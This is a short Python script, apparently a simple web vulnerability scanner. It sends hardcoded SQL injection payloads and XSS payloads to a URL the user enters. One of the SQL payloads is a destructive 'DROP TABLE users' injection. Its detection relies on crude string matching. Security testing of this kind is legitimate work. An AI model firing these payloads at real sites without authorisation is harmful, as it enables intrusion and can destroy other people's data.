import requests
from urllib.parse import quote

# Define payloads for SQL Injection and XSS
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<img src=x onerror=alert('XSS')>",
]

def scan_sql_injection(url):
    print("Scanning for SQL Injection vulnerabilities...")
    for payload in SQL_INJECTION_PAYLOADS:
        # Construct the full URL with the payload
        full_url = url + quote(payload)
        response = requests.get(full_url)

        # Check for SQL error messages
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            print(f"Potential SQL Injection vulnerability found with payload: {payload}")
        else:
            print(f"No SQL Injection vulnerability found with payload: {payload}")

def scan_xss(url):
    print("Scanning for XSS vulnerabilities...")
    for payload in XSS_PAYLOADS:
        # Construct the full URL with the payload
        full_url = f"{url}?input={quote(payload)}"
        response = requests.get(full_url)

        # Check if the payload appears in the response
        if payload in response.text:
            print(f"Potential XSS vulnerability found with payload: {payload}")
        else:
            print(f"No XSS vulnerability found with payload: {payload}")

def scan_website(url):
    print(f"Scanning website: {url}")
    scan_sql_injection(url)
    scan_xss(url)

if __name__ == "__main__":
    target_url = input("Enter the URL to scan (make sure it ends with a / if needed): ")
    scan_website(target_url)
